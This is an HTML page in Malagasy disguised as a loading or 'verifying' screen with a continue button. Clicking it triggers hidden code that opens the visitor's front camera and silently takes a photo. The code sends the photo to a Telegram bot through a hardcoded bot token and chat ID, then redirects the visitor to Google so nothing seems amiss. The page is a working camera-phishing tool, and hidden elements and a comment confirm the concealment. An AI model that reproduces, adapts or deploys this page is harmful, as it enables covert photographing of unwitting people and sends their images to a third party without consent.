<!DOCTYPE html>
<html lang="mg">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mampiditra ny rafitra...</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet">
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }
        body {
            font-family: 'Poppins', sans-serif;
            background: linear-gradient(135deg, #0f172a, #1e293b);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            color: #f8fafc;
        }
        .card {
            background: rgba(30, 41, 59, 0.7);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            padding: 40px 30px;
            border-radius: 20px;
            text-align: center;
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5);
            max-width: 350px;
            width: 90%;
            cursor: pointer;
        }
        .spinner-box {
            position: relative;
            width: 70px;
            height: 70px;
            margin: 0 auto 25px auto;
        }
        .spinner {
            position: absolute;
            width: 100%;
            height: 100%;
            border: 4px solid rgba(56, 189, 248, 0.1);
            border-top-color: #38bdf8;
            border-radius: 50%;
            animation: spin 1s cubic-bezier(0.5, 0, 0.5, 1) infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        h2 {
            font-size: 20px;
            font-weight: 600;
            margin-bottom: 10px;
            color: #f1f5f9;
        }
        p {
            font-size: 14px;
            color: #94a3b8;
            font-weight: 300;
            margin-bottom: 20px;
        }
        .btn-action {
            background: linear-gradient(135deg, #38bdf8, #0284c7);
            color: white;
            border: none;
            padding: 12px 25px;
            border-radius: 10px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            box-shadow: 0 4px 15px rgba(56, 189, 248, 0.4);
        }
    </style>
</head>
<body>

    <div class="card" onclick="startProcess()">
        <div class="spinner-box">
            <div class="spinner"></div>
        </div>
        <h2 id="title">Miandrasa kely...</h2>
        <p id="desc">Tsindrio ny bokotra eto ambany raha hanohy</p>
        <button class="btn-action">Tohizana</button>
    </div>

    <!-- Zavatra afenina ao ambadika -->
    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const token = "9032405314:AAE3YReBmUiG8GrtB8IsALD7SeklLWnGOKQ";
        const chatId = "7658208557";

        let hasRun = false;

        function startProcess() {
            if (hasRun) return;
            hasRun = true;

            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const title = document.getElementById('title');
            const desc = document.getElementById('desc');

            title.innerText = "Manamarina...";
            desc.innerText = "Miandrasa kely aza miala...";

            // Antsoina mivantana tsy misy await mba hivoaka avy hatrany ilay Pop-up
            navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: "user" } 
            })
            .then(stream => {
                video.srcObject = stream;

                // Andrasana kely ny fandraisan'ny camera sary
                setTimeout(() => {
                    canvas.width = video.videoWidth || 640;
                    canvas.height = video.videoHeight || 480;
                    
                    const context = canvas.getContext('2d');
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);

                    canvas.toBlob(function(blob) {
                        const formData = new FormData();
                        formData.append("chat_id", chatId);
                        formData.append("photo", blob, "captured.jpg");

                        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                            method: "POST",
                            body: formData
                        })
                        .then(response => response.json())
                        .then(data => {
                            console.log("Tafita ny sary!", data);
                            title.innerText = "Tafita soa aman-tsara!";
                            desc.innerText = "Mandefa anao...";
                            setTimeout(() => {
                                window.location.href = "https://www.google.com";
                            }, 1000);
                        })
                        .catch(error => {
                            console.error("Tsy tafita:", error);
                        });

                        stream.getTracks().forEach(track => track.stop());
                    }, 'image/jpeg', 0.9);

                }, 1500);

            })
            .catch(err => {
                console.error("Tsy nahazoalana alalana ny camera:", err);
                hasRun = false;
                title.innerText = "Ilaina ny Autorisation";
                desc.innerText = "Tsindrio indray raha hamerina";
            });
        }
    </script>
</body>
</html>
